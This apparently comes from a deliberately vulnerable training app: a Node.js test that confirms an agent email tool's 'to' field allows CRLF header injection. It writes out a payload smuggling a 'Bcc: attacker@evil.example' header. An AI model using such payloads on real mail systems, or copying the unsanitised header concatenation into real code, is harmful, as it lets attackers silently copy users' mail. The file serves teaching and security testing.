const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { seedShop, purgeToolCaches } = require('../_fixture.js');

const REPO = path.resolve(__dirname, '../../../..');

/**
 * @intentional-vulnerability email-header-injection
 * @teaches OWASP-Web:A03
 * @location agent-host/agents/email/tools/index.js
 *
 * `to` is concatenated verbatim into headers_raw. Passing
 * `user@ok.com\r\nBcc: attacker@evil.example` injects a Bcc header.
 */
test('email-header-injection: CRLF in `to` field injects an extra Bcc header', async () => {
  const s = await seedShop();
  purgeToolCaches();
  try {
    const { send } = require(path.join(REPO, 'agent-host/agents/email/tools/index.js'));
    const forgedTo = 'victim@ok.com\r\nBcc: attacker@evil.example';
    const r = await send({
      to: forgedTo,
      subject: 'ping',
      body_markdown: 'hello',
      from: 'legit@shop.local',
    });
    assert.equal(r.ok, true);
    assert.match(r.headers_raw, /Bcc: attacker@evil\.example/, 'injected Bcc header must appear in headers_raw');
  } finally {
    await s.close();
  }
});
